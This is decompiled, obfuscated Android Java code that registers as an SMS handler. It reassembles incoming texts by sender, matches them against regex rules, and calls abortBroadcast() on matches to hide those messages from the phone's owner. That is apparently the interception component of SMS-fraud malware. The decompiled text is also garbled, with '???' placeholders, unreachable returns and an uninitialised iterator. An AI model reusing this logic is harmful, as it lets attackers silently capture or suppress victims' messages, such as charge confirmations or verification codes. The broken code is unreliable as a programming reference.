package com.cp;

import android.content.BroadcastReceiver;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import java.util.Map.Entry;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public final class n
  implements i
{
  private static Object a = new Object();
  private Map b = null;
  private ArrayList c = null;
  private l d = null;
  
  public n() {}
  
  private static l a(Map paramMap, ArrayList paramArrayList)
  {
    Object localObject;
    String str;
    m localM;
    do
    {
      paramMap = paramMap.entrySet().iterator();
      Iterator localIterator;
      while (!localIterator.hasNext())
      {
        if (!paramMap.hasNext()) {
          break;
        }
        localObject = (Map.Entry)paramMap.next();
        str = (String)((Map.Entry)localObject).getKey();
        localObject = ((Map.Entry)localObject).getValue().toString().trim();
        localIterator = paramArrayList.iterator();
      }
      localM = (m)localIterator.next();
    } while ((!a(str, localM.b)) || (!a((String)localObject, localM.c)));
    return new l(localM.a, str, localM.d);
    return null;
  }
  
  private static boolean a(String paramString1, String paramString2)
  {
    try
    {
      boolean bool = Pattern.compile(paramString2, 32).matcher(paramString1).matches();
      return bool;
    }
    catch (RuntimeException paramString1) {}
    return false;
  }
  
  public final l a(long paramLong, ArrayList paramArrayList)
  {
    synchronized (a)
    {
      this.c = paramArrayList;
      this.d = null;
    }
    try
    {
      a.wait(paramLong);
      this.c = null;
      return this.d;
      paramArrayList = finally;
      throw paramArrayList;
    }
    catch (InterruptedException paramArrayList)
    {
      for (;;) {}
    }
  }
  
  public final void a(Intent arg1, BroadcastReceiver paramBroadcastReceiver)
  {
    int j = 0;
    Object localObject1 = (Object[])???.getExtras().get(k.㾾("┹쳍ⶌ꫑"));
    ??? = new SmsMessage[localObject1.length];
    int i = 0;
    while (i < localObject1.length)
    {
      ???[i] = SmsMessage.createFromPdu((byte[])localObject1[i]);
      i += 1;
    }
    localObject1 = new HashMap();
    int k = ???.length;
    i = j;
    if (i < k)
    {
      Object localObject2 = ???[i];
      String str = localObject2.getOriginatingAddress();
      if (((Map)localObject1).containsKey(str)) {
        ((StringBuilder)((Map)localObject1).get(str)).append(localObject2.getMessageBody());
      }
      for (;;)
      {
        i += 1;
        break;
        StringBuilder localStringBuilder = new StringBuilder();
        localStringBuilder.append(localObject2.getMessageBody());
        ((Map)localObject1).put(str, localStringBuilder);
      }
    }
    this.b = ((Map)localObject1);
    synchronized (a)
    {
      if ((this.b != null) && (this.c != null))
      {
        this.d = a(this.b, this.c);
        localObject1 = this.d;
        if ((this.d != null) && (this.d.c)) {
          paramBroadcastReceiver.abortBroadcast();
        }
        a.notify();
        return;
      }
      this.d = null;
    }
  }
}
